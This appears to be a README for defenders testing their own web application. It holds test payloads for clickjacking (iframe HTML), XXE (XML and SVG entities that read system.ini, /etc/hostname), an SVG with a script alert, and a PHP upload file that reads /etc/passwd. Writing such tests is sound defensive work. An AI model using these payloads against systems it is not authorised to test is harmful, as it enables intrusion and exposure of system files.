We will not be hosting files because most people cannot download vulnerable files off github from company networks.
Please understand how these files work before utilizing them.


### Clickjacking
Put the link to your site into the iframe section at the bottom of each file, then save as an html file. Log in to your application, then double click on the following html file so that it opens in the same browser. If you can see your website in the iframe, this proves your application is vulnerable to clickjacking.

The following files come from PortSwigger: https://portswigger.net/web-security/clickjacking

**Basic: test1.html**
```
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://www.yourSiteHere.com/dashboard"></iframe>
```

**Frame busting: test2.html**
```
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="https://www.yourSiteHere.com/dashboard"></iframe>
```



Before testing the files below, try uploading calc.exe from a Windows computer. If it successfully uploads, start the remediation procedures. If calc.exe does not upload, or if you want to test further, attempt to upload the files below.

### XXE
**XXE File: Test.xml**
Please note that the file called below should be replaced with a valid Linux file if the Web Server is Linux based.
```
<?xml version="1.0"?>
<!DOCTYPE test [
<!ELEMENT test ANY >
<!ENTITY test SYSTEM "file:///c:/Windows/system.ini" >]><test>&test;</test>
```

**SVG File: test.svg**
https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
### XSS
**SVG file: testabc.svg**
https://github.com/makeplane/plane/security/advisories/GHSA-rcg8-g69v-x23j
```
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 124 124" fill="none">
<rect width="124" height="124" rx="24" fill="#000000"/>
   <script type="text/javascript">  
      alert(0x539);
   </script>
</svg>
```

**PDF File: XSSinPDF.pdf**
https://portswigger.net/research/portable-data-exfiltration

https://owasp.org/www-chapter-belgium/assets/2007/2007-06-22/OWASP_BeLux_2007-06-22_Protecting_Web_Applications_from_Universal_PDF_XSS.pdf

Known benign XSSinPDF to download: https://github.com/ynsmroztas/pdfsvgxsspayload/blob/main/poc.pdf

### Remote Code Execution
**PHP File Upload: file1.php**
Please note that the file called below should be replaced with a valid Windows file if the Web Server is Linux based.

```
<?php echo file_get_contents('/etc/passwd'); ?>
```

